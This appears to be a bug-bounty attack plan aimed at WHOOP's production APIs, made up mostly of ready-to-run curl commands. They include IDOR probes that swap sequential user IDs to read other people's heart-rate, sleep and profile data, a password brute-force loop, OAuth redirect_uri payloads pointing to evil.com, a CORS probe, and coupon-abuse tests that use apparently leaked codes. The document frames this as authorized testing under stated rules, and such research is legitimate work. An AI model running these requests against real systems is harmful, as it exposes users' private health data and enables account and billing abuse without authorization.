# WHOOP — Actionable Attack Plan
## Ready-to-Execute Testing Guide (From Passive Recon Findings)

> **Status**: Recon complete. Ready for active testing.
> **Prerequisite**: You need a WHOOP account (purchase/trial the device).
> **Setup**: Burp Suite proxy configured, two WHOOP accounts (Account A = victim, Account B = attacker)

---

## 🔴 PRIORITY 1: IDOR on Health Data (Highest Probability of Critical)

### Why This First
- User IDs are **sequential integers** (e.g., 238633)
- Multiple endpoints accept `{userId}` as a path parameter
- WHOOP explicitly says they pay for "unauthorized access to data beyond the credential's expected access"
- Health data (heart rate, HRV, sleep) = **Critical severity** immediately

### Test Script (Execute with Burp Repeater)

```bash
# Step 1: Authenticate as YOUR account (Account B - the attacker)
curl -X POST https://api.prod.whoop.com/oauth/token \
  -H "Content-Type: application/json" \
  -d '{
    "username": "YOUR_EMAIL",
    "password": "YOUR_PASSWORD",
    "grant_type": "password",
    "issueRefresh": true
  }'
# Save the access_token from response

# Step 2: Get YOUR user ID from the token response (note the user.id field)
# Your ID = e.g., 300001

# Step 3: TEST IDOR — Access another user's heart rate data
# Try userId = YOUR_ID - 1, YOUR_ID + 1, or known test values
curl -X GET "https://api.prod.whoop.com/users/300000/metrics/heart_rate?start=2025-01-01T00:00:00.000Z&end=2025-01-02T00:00:00.000Z&step=60" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"

# Step 4: TEST IDOR — Access another user's profile
curl -X GET "https://api-7.whoop.com/users/300000?include=profile" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"

# Step 5: TEST IDOR — Access another user's cycles (ALL health data)
curl -X GET "https://api.prod.whoop.com/activities-service/v1/cycles/aggregate/range/300000?startTime=2025-01-01T00:00:00.000Z&endTime=2025-06-01T00:00:00.000Z" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"

# Step 6: TEST IDOR — Access another user's sleep details
# First get a sleepId from your own data, then try with another userId
curl -X GET "https://api.prod.whoop.com/users/300000/sleeps/93802122" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"

# Step 7: TEST IDOR — Access another user's workout details
curl -X GET "https://api.prod.whoop.com/activities-service/v1/workouts/357487075?userId=300000" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"
```

### Expected Results
| Response | Meaning |
|----------|---------|
| **200 + other user's data** | 🔴 **CRITICAL IDOR — Report immediately** |
| 403 Forbidden | Authorization check exists (endpoint is secure) |
| 404 Not Found | User doesn't exist or endpoint is wrong |
| 401 Unauthorized | Token issue (re-authenticate) |

---

## 🔴 PRIORITY 2: Dev/Staging Environment Access

### Why This Is Critical
The OpenAPI spec reveals `api.dev.whoop.com` exists. If accessible with production creds or without auth = massive finding.

```bash
# Test 1: Can you reach the dev API?
curl -v https://api.dev.whoop.com/
curl -v https://api.dev.whoop.com/oauth/token

# Test 2: Do production credentials work on dev?
curl -X POST https://api.dev.whoop.com/oauth/token \
  -H "Content-Type: application/json" \
  -d '{
    "username": "YOUR_EMAIL",
    "password": "YOUR_PASSWORD",
    "grant_type": "password",
    "issueRefresh": true
  }'

# Test 3: Does api-7.whoop.com have looser authorization?
curl -X GET "https://api-7.whoop.com/users/1?include=profile&include=teams" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"

# Test 4: Are there other API versions without auth?
curl -v https://api.prod.whoop.com/activities-service/v0/
curl -v https://api.prod.whoop.com/activities-service/v1/
curl -v https://api.prod.whoop.com/activities-service/v2/
```

---

## 🔴 PRIORITY 3: OAuth & Authentication Attacks

### 3.1 Password Grant Abuse

```bash
# Test rate limiting on password grant
# (Be careful — don't trigger account lockout on your OWN account)
# Test with YOUR credentials, observe if rate limiting exists

for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.prod.whoop.com/oauth/token \
    -H "Content-Type: application/json" \
    -d '{"username":"YOUR_EMAIL","password":"wrong_pass_'$i'","grant_type":"password"}'
  echo " - attempt $i"
  sleep 1
done
# If all return 401 without 429 = no rate limiting = report
```

### 3.2 Token Validation Checks

```bash
# Test 1: Does the token expire properly?
# Save a token, wait past expiry, try to use it

# Test 2: Change your password, then use the OLD token
# If old token still works = session not invalidated = reportable

# Test 3: Token scope escalation
# Authenticate via developer OAuth with limited scopes (e.g., read:profile only)
# Then try to access health data endpoints (read:recovery, read:sleep)
curl -X GET "https://api.prod.whoop.com/developer/v1/activity/sleep" \
  -H "Authorization: Bearer LIMITED_SCOPE_TOKEN"
# If it returns data = scope validation broken
```

### 3.3 OAuth Redirect URI Manipulation

```bash
# When using the OAuth2 authorization code flow:
# Auth URL: https://api.prod.whoop.com/oauth/oauth2/auth

# Test redirect_uri manipulation:
# Normal: redirect_uri=https://myapp.com/callback
# Attack: redirect_uri=https://myapp.com.evil.com/callback
# Attack: redirect_uri=https://evil.com
# Attack: redirect_uri=https://myapp.com/callback/../../../evil
# Attack: redirect_uri=https://myapp.com/callback%0d%0aLocation:%20http://evil.com

# The docs say valid URLs are:
# https://whoop.com/example/redirect or whoop://example/redirect
# Test: Can you register a custom scheme that another app intercepts?
# whoop://evil-deep-link
```

---

## 🟠 PRIORITY 4: Performance Report IDOR

```bash
# The /activities-service/v1/performance-assessment/url/{reportId} endpoint
# returns a URL for a performance report. If reportIds are sequential:

# Get YOUR report list first
curl -X GET "https://api.prod.whoop.com/activities-service/v1/performance-assessment/week" \
  -H "Authorization: Bearer YOUR_TOKEN"
# Note the report IDs (e.g., 15571241, 15571242...)

# Now try adjacent report IDs (other users' reports)
curl -X GET "https://api.prod.whoop.com/activities-service/v1/performance-assessment/url/15571240" \
  -H "Authorization: Bearer YOUR_TOKEN"

curl -X GET "https://api.prod.whoop.com/activities-service/v1/performance-assessment/url/15571239" \
  -H "Authorization: Bearer YOUR_TOKEN"
# If you get a URL to another user's performance report = IDOR
```

---

## 🟠 PRIORITY 5: Membership/Subscription Logic Bugs

```bash
# The /membership endpoint reveals coupon codes and subscription details
curl -X GET "https://api.prod.whoop.com/membership" \
  -H "Authorization: Bearer YOUR_TOKEN"

# Interesting fields revealed in the API spec:
# - cancellationOffer.coupon50: "CANCEL50"
# - cancellationOffer.coupon100: "FREEMONTH01302020"
# - cancellationOffer.couponOneMonth50: "CANCEL50ONEMONTH"

# Test: Can these coupons be applied without going through cancellation flow?
# Test: Can you apply FREEMONTH01302020 on a new subscription?
# Test: Can you stack multiple coupons?
# Test: Does modifying the membership request allow plan changes?

# Check for IDOR on membership
curl -X GET "https://api.prod.whoop.com/membership?userId=300000" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

---

## 🟡 PRIORITY 6: Additional Endpoint Testing

### 6.1 Voice of Whoop — viewId Parameter IDOR

```bash
# The vow-service takes a viewId parameter that "seems to also be a user ID"
curl -X GET "https://api.prod.whoop.com/vow-service/v1/vows/activity/350838061?viewId=300000" \
  -H "Authorization: Bearer YOUR_TOKEN"

# Try different viewId values — can you see other users' insights?
```

### 6.2 Survey Response IDOR

```bash
# Survey responses for workouts use userId as a query parameter
curl -X GET "https://api.prod.whoop.com/activities-service/v0/workouts/357487075/survey/response?userId=300000" \
  -H "Authorization: Bearer YOUR_TOKEN"
# v0 endpoint (legacy!) — might have weaker authorization
```

### 6.3 Sleep Events — activityId Enumeration

```bash
# Sleep events use activityId — if you guess another user's activity ID:
curl -X GET "https://api.prod.whoop.com/activities-service/v1/sleep-events?activityId=357425837" \
  -H "Authorization: Bearer YOUR_TOKEN"
# Sequential IDs mean you can enumerate
```

---

## 🟡 PRIORITY 7: Web Application Testing (app.whoop.com)

```bash
# Check for exposed source maps
curl -sI https://app.whoop.com/main.js.map
curl -sI https://app.whoop.com/static/js/main.*.js.map

# Check CORS configuration
curl -v -H "Origin: https://evil.com" https://api.prod.whoop.com/developer/v1/activity/sleep
# If Access-Control-Allow-Origin: https://evil.com → CORS misconfiguration

# Check for open redirects (for OAuth chain)
# Test any redirect parameters on app.whoop.com, join.whoop.com

# Check CSP headers
curl -sI https://app.whoop.com | grep -i "content-security-policy"
```

---

## Testing Methodology — The Workflow

```
┌─────────────────────────────────────────────────────────┐
│  STEP 1: Setup                                           │
│  - Create 2 WHOOP accounts (Account A, Account B)       │
│  - Authenticate both, save tokens                        │
│  - Note both user IDs (sequential integers)              │
└────────────────────────┬────────────────────────────────┘
                         │
┌────────────────────────▼────────────────────────────────┐
│  STEP 2: IDOR Sweep (Use Account B's token)              │
│  - For EVERY endpoint with {userId}: swap to Account A   │
│  - For EVERY endpoint with {resourceId}: try A's IDs     │
│  - Test on api.prod.whoop.com AND api-7.whoop.com        │
│  - Test v0, v1, v2 endpoints (version downgrade)         │
└────────────────────────┬────────────────────────────────┘
                         │
┌────────────────────────▼────────────────────────────────┐
│  STEP 3: Auth Testing                                    │
│  - Test token after password change                      │
│  - Test rate limiting on /oauth/token                    │
│  - Test scope escalation                                 │
│  - Test redirect_uri manipulation                        │
│  - Test dev environment access                           │
└────────────────────────┬────────────────────────────────┘
                         │
┌────────────────────────▼────────────────────────────────┐
│  STEP 4: Business Logic                                  │
│  - Membership coupon abuse                               │
│  - Performance report IDOR                               │
│  - Subscription manipulation                             │
└────────────────────────┬────────────────────────────────┘
                         │
┌────────────────────────▼────────────────────────────────┐
│  STEP 5: Report Writing                                  │
│  - Clear PoC with curl commands                          │
│  - Impact: "access to X million users' health data"      │
│  - Severity: Critical (health data = PHI)                │
│  - Include both successful and failed attempts           │
└─────────────────────────────────────────────────────────┘
```

---

## ⚠️ Rules Reminders (Don't Get Banned)

| ✅ DO | ❌ DON'T |
|-------|----------|
| Test with your own 2 accounts | Access data of real users beyond verification |
| Be methodical and document everything | Randomly fuzz the API with automated tools |
| Stop at proving access (1-2 other IDs) | Enumerate all 300K+ users |
| Report immediately on first confirmed IDOR | Continue exploiting after confirmation |
| Use reasonable request rates (1 req/sec) | Blast the API with rapid-fire requests |
| Test only in-scope targets | Touch support systems, Okta, metrics |

---

## Quick Reference Card

| Endpoint | IDOR Parameter | Data Exposed | Severity |
|----------|---------------|--------------|----------|
| `/users/{userId}` | userId (path) | Email, name, location, profile | HIGH |
| `/users/{userId}/metrics/heart_rate` | userId (path) | Real-time heart rate (6s granularity) | CRITICAL |
| `/activities-service/v1/cycles/aggregate/range/{userId}` | userId (path) | ALL health data (sleep, recovery, strain) | CRITICAL |
| `/users/{userId}/sleeps/{sleepId}` | userId + sleepId | Detailed sleep stages, duration | CRITICAL |
| `/activities-service/v1/workouts/{id}?userId=X` | userId (query) | Workout HR, strain, activity | HIGH |
| `/activities-service/v0/workouts/{id}/survey/response?userId=X` | userId (query) | Personal survey answers | HIGH |
| `/activities-service/v1/performance-assessment/url/{reportId}` | reportId (path) | Weekly performance report URL | HIGH |
| `/vow-service/v1/vows/activity/{id}?viewId=X` | viewId (query) | Personalized health insights | MEDIUM |
| `/membership` | implicit user | Subscription, payment info, coupons | HIGH |

---

*Ready to execute. Start with Priority 1 IDOR tests. First confirmed access to another user's health data = immediate Critical report.*
